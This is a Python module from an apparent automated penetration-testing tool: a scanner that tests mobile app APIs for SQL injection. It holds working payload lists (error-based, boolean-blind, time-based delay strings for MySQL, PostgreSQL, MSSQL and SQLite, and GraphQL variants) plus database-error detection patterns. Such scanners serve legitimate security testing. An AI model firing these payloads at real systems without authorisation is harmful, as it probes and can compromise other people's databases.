"""
Jarwis AGI Pen Test - Mobile SQL Injection Scanner

Detects SQL Injection vulnerabilities in mobile app API traffic.
Extends BaseMobileScanner for MITM-first methodology.

OWASP Mobile Top 10 2024: M4 - Insufficient Input/Output Validation
CWE-89: SQL Injection

Mobile-specific considerations:
- Mobile apps often use ORMs which may escape some SQLi
- GraphQL APIs are common in mobile
- Binary protocols (protobuf) may contain injectable fields
- Rate limiting may be less strict on mobile endpoints
"""

import asyncio
import logging
import re
from typing import Dict, List, Optional, Any, Tuple

from attacks.mobile.base_mobile_scanner import (
    BaseMobileScanner,
    MobileFinding,
    Severity,
    Confidence
)
from core.mobile_http_client import MobileHTTPClient, MobileAttackResponse
from core.mobile_request_store import MobileRequestStoreDB, StoredMobileRequest

logger = logging.getLogger(__name__)


class MobileSQLiScanner(BaseMobileScanner):
    """
    SQL Injection Scanner for Mobile APIs
    
    Scans mobile app traffic for SQLi vulnerabilities.
    Uses MITM-captured requests to test injection points.
    
    Attack vectors:
    - Error-based SQLi
    - Boolean-based blind SQLi  
    - Time-based blind SQLi (configurable delay)
    - GraphQL injection
    """
    
    # Scanner identification
    scanner_name = "mobile_sqli"
    attack_type = "sqli"
    vuln_type = "sqli"  # Maps to VULN_REGISTRY
    owasp_category = "M4"  # Insufficient Input/Output Validation
    cwe_id = "CWE-89"
    
    # Database error patterns for detection
    DB_ERRORS = {
        'mysql': [
            r'SQL syntax.*MySQL',
            r'Warning.*mysql_',
            r'MySQL Query fail',
            r'valid MySQL result',
            r'MySQLSyntaxErrorException',
            r'com\.mysql\.jdbc',
            r'Unclosed quotation mark',
        ],
        'postgresql': [
            r'PostgreSQL.*ERROR',
            r'Warning.*pg_',
            r'valid PostgreSQL result',
            r'Npgsql\.',
            r'PG::SyntaxError',
            r'PSQLException',
        ],
        'mssql': [
            r'Driver.* SQL[\-\_\ ]*Server',
            r'OLE DB.* SQL Server',
            r'SQLServer JDBC Driver',
            r'SqlClient\.',
            r'Unclosed quotation mark after the character string',
            r'\bODBC SQL Server Driver\b',
        ],
        'oracle': [
            r'\bORA-\d{5}',
            r'Oracle error',
            r'Warning.*oci_',
            r'Oracle.*Driver',
            r'OracleException',
        ],
        'sqlite': [
            r'SQLite\/JDBCDriver',
            r'SQLite\.Exception',
            r'System\.Data\.SQLite\.SQLiteException',
            r'SQLITE_ERROR',
            r'sqlite3\.OperationalError',
            r'android\.database\.sqlite',  # Android SQLite
        ],
        'generic': [
            r'SQL syntax',
            r'syntax error',
            r'unexpected end of SQL',
            r'quoted string not properly terminated',
            r'SQL command not properly ended',
            r'"error":\s*".*SQL',  # JSON API errors
            r'"message":\s*".*query',
        ],
    }
    
    # Error-based payloads
    ERROR_PAYLOADS = [
        "'",
        "''",
        '`',
        '"',
        "'--",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "1 AND 1=1",
        "1 AND 1=2",
        "admin'--",
        "' UNION SELECT NULL--",
        "') OR ('1'='1",
    ]
    
    # Boolean-based payloads (true, false pairs)
    BOOLEAN_PAYLOADS = [
        ("1' AND '1'='1", "1' AND '1'='2"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("' OR '1'='1", "' OR '1'='2"),
        ("1' OR '1'='1' --", "1' OR '1'='2' --"),
    ]
    
    # Time-based payloads
    TIME_PAYLOADS = {
        'mysql': "'; SLEEP({delay})--",
        'postgresql': "'; SELECT pg_sleep({delay})--",
        'mssql': "'; WAITFOR DELAY '0:0:{delay}'--",
        'sqlite': "' AND 1=RANDOMBLOB({delay}00000000)--",  # SQLite timing trick
    }
    
    # GraphQL-specific SQLi payloads
    GRAPHQL_PAYLOADS = [
        '") { __typename }--',
        '" OR 1=1--',
        '") OR (1=1',
        '\\") OR (\\"1\\"=\\"1',
    ]
    
    # High-priority parameters for SQLi
    PRIORITY_PARAMS = [
        'id', 'user', 'userId', 'user_id', 'uid', 'pid', 'item',
        'product', 'productId', 'category', 'name', 'order', 'sort',
        'search', 'query', 'q', 'page', 'email', 'type', 'date',
        'filter', 'select', 'key', 'token', 'session'
    ]
    
    def __init__(
        self,
        http_client: MobileHTTPClient,
        request_store: MobileRequestStoreDB,
        time_delay: float = 3.0,
        test_graphql: bool = True,
        **kwargs
    ):
        """
        Initialize Mobile SQLi Scanner.
        
        Args:
            http_client: Mobile HTTP client for attacks
            request_store: Mobile request store
            time_delay: Seconds for time-based detection
            test_graphql: Test GraphQL injection patterns
        """
        super().__init__(http_client, request_store, **kwargs)
        self.time_delay = time_delay
        self.test_graphql = test_graphql
    
    def get_payloads(self) -> List[str]:
        """Return error-based payloads for quick testing."""
        return self.ERROR_PAYLOADS[:self.max_payloads_per_param]
    
    def is_applicable(self, request: StoredMobileRequest) -> bool:
        """Check if request should be tested for SQLi."""
        # Skip static resources
        if request.endpoint_type == 'static':
            return False
        
        # Must have parameters
        if not request.parameters:
            return False
        
        # Prioritize requests with SQLi-prone parameters
        param_names = [p.lower() for p in request.parameters.keys()]
        has_priority_param = any(
            any(prio in name for prio in self.PRIORITY_PARAMS)
            for name in param_names
        )
        
        # Test if has priority params or is dynamic endpoint
        return has_priority_param or request.endpoint_type == 'dynamic'
    
    async def scan_request(self, request: StoredMobileRequest) -> List[MobileFinding]:
        """
        Scan a request for SQL injection vulnerabilities.
        
        Flow:
        1. Get baseline response
        2. Test each parameter with error-based payloads
        3. Test with boolean-based payloads
        4. Test with time-based payloads (if enabled)
        5. Test GraphQL-specific payloads (if applicable)
        """
        findings = []
        
        # Get baseline response
        baseline = await self.get_baseline(request)
        if not baseline:
            logger.warning(f"[{self.scanner_name}] No baseline for {request.url}")
            return findings
        
        baseline_time_ms = baseline.response_time_ms
        is_graphql = self._is_graphql_request(request)
        
        # Test each parameter
        for param_name, param_value in request.parameters.items():
            if self._cancelled:
                break
            
            # Determine injection locations
            locations = self._get_injection_locations(request, param_name)
            
            for location in locations:
                # 1. Error-based testing
                error_finding = await self._test_error_based(
                    request, param_name, location, baseline
                )
                if error_finding:
                    findings.append(error_finding)
                    continue
                
                # 2. Boolean-based testing
                boolean_finding = await self._test_boolean_based(
                    request, param_name, location, baseline
                )
                if boolean_finding:
                    findings.append(boolean_finding)
                    continue
                
                # 3. Time-based testing (slower, do last)
                time_finding = await self._test_time_based(
                    request, param_name, location, baseline_time_ms
                )
                if time_finding:
                    findings.append(time_finding)
        
        # 4. GraphQL-specific testing
        if is_graphql and self.test_graphql:
            graphql_findings = await self._test_graphql_injection(request, baseline)
            findings.extend(graphql_findings)
        
        return findings
    
    def _get_injection_locations(
        self,
        request: StoredMobileRequest,
        param_name: str
    ) -> List[str]:
        """Determine where to inject payloads for this parameter."""
        locations = []
        
        # Check if param is in query string
        if '?' in request.url and param_name in request.url:
            locations.append('query')
        
        # Check if param is in body
        if request.body and param_name in request.body:
            locations.append('body')
        
        # Default based on method
        if not locations:
            if request.method.upper() == 'GET':
                locations.append('query')
            else:
                locations.append('body')
        
        return locations
    
    def _is_graphql_request(self, request: StoredMobileRequest) -> bool:
        """Check if request is a GraphQL request."""
        if '/graphql' in request.url.lower():
            return True
        if request.body:
            try:
                body_lower = request.body.lower()
                return 'query' in body_lower and ('mutation' in body_lower or '{' in body_lower)
            except:
                pass
        return False
    
    async def _test_error_based(
        self,
        request: StoredMobileRequest,
        param_name: str,
        location: str,
        baseline: MobileAttackResponse
    ) -> Optional[MobileFinding]:
        """Test for error-based SQL injection."""
        
        for payload in self.ERROR_PAYLOADS[:self.max_payloads_per_param]:
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            # Check for SQL error patterns
            db_type, error_pattern = self._check_sql_errors(response)
            
            if db_type:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=f"Database error detected ({db_type}): {error_pattern}",
                    confidence=Confidence.HIGH,
                    severity=Severity.CRITICAL,
                    title=f"Error-based SQL Injection in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' is vulnerable to SQL injection. "
                        f"A {db_type} database error was detected when injecting SQL "
                        f"syntax characters. Mobile API endpoint: {request.url}"
                    ),
                    parameter=param_name
                )
        
        return None
    
    def _check_sql_errors(
        self,
        response: MobileAttackResponse
    ) -> Tuple[Optional[str], Optional[str]]:
        """Check response for SQL error patterns."""
        body = response.body or ""
        
        for db_type, patterns in self.DB_ERRORS.items():
            for pattern in patterns:
                match = re.search(pattern, body, re.IGNORECASE)
                if match:
                    return db_type, match.group(0)
        
        return None, None
    
    async def _test_boolean_based(
        self,
        request: StoredMobileRequest,
        param_name: str,
        location: str,
        baseline: MobileAttackResponse
    ) -> Optional[MobileFinding]:
        """Test for boolean-based blind SQL injection."""
        
        for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
            # Send true condition
            true_response = await self.send_payload(
                request=request,
                payload=true_payload,
                location=location,
                parameter_name=param_name
            )
            
            if not true_response:
                continue
            
            await asyncio.sleep(0.2)
            
            # Send false condition
            false_response = await self.send_payload(
                request=request,
                payload=false_payload,
                location=location,
                parameter_name=param_name
            )
            
            if not false_response:
                continue
            
            # Check for significant response difference
            if self._responses_differ(true_response, false_response):
                evidence = (
                    f"True condition ({true_payload}): {true_response.status_code}, "
                    f"{len(true_response.body or '')} bytes. "
                    f"False condition ({false_payload}): {false_response.status_code}, "
                    f"{len(false_response.body or '')} bytes."
                )
                
                return self.create_finding(
                    request=request,
                    response=true_response,
                    payload=true_payload,
                    evidence=evidence,
                    confidence=Confidence.HIGH,
                    severity=Severity.HIGH,
                    title=f"Boolean-based Blind SQL Injection in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' shows different responses "
                        f"based on injected boolean SQL conditions, indicating "
                        f"blind SQL injection. Mobile app: {request.app_package}"
                    ),
                    parameter=param_name
                )
        
        return None
    
    def _responses_differ(
        self,
        response1: MobileAttackResponse,
        response2: MobileAttackResponse
    ) -> bool:
        """Check if two responses differ significantly."""
        # Different status codes
        if response1.status_code != response2.status_code:
            return True
        
        # Different content lengths (>20% difference)
        len1 = len(response1.body or '')
        len2 = len(response2.body or '')
        if len1 > 0 and len2 > 0:
            diff_ratio = abs(len1 - len2) / max(len1, len2)
            if diff_ratio > 0.2:
                return True
        
        # Check JSON response differences
        json1 = response1.json()
        json2 = response2.json()
        if json1 and json2:
            # Different result counts
            for key in ['count', 'total', 'results', 'data']:
                if key in json1 and key in json2:
                    if json1[key] != json2[key]:
                        return True
        
        return False
    
    async def _test_time_based(
        self,
        request: StoredMobileRequest,
        param_name: str,
        location: str,
        baseline_time_ms: float
    ) -> Optional[MobileFinding]:
        """Test for time-based blind SQL injection."""
        
        for db_type, payload_template in self.TIME_PAYLOADS.items():
            payload = payload_template.format(delay=int(self.time_delay))
            
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            # Check if response was delayed
            expected_delay_ms = self.time_delay * 1000
            actual_delay = response.response_time_ms - baseline_time_ms
            
            if actual_delay >= (expected_delay_ms * 0.8):  # 80% threshold
                evidence = (
                    f"Response delayed by {actual_delay:.0f}ms "
                    f"(baseline: {baseline_time_ms:.0f}ms). "
                    f"Expected {expected_delay_ms:.0f}ms from {db_type} payload."
                )
                
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=evidence,
                    confidence=Confidence.HIGH,
                    severity=Severity.HIGH,
                    title=f"Time-based Blind SQL Injection in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' is vulnerable to time-based "
                        f"blind SQL injection. The {db_type} time delay payload "
                        f"caused a measurable response delay."
                    ),
                    parameter=param_name
                )
        
        return None
    
    async def _test_graphql_injection(
        self,
        request: StoredMobileRequest,
        baseline: MobileAttackResponse
    ) -> List[MobileFinding]:
        """Test GraphQL-specific SQL injection vectors."""
        findings = []
        
        if not request.body:
            return findings
        
        for payload in self.GRAPHQL_PAYLOADS:
            # Inject into GraphQL variables
            response = await self.send_payload(
                request=request,
                payload=payload,
                location='body',
                parameter_name='query'
            )
            
            if not response:
                continue
            
            # Check for SQL errors in GraphQL response
            db_type, error_pattern = self._check_sql_errors(response)
            
            if db_type:
                findings.append(self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=f"GraphQL SQL injection ({db_type}): {error_pattern}",
                    confidence=Confidence.HIGH,
                    severity=Severity.CRITICAL,
                    title="GraphQL SQL Injection",
                    description=(
                        f"The GraphQL endpoint is vulnerable to SQL injection. "
                        f"A {db_type} error was triggered through the GraphQL query."
                    ),
                    parameter='graphql_query'
                ))
                break
        
        return findings
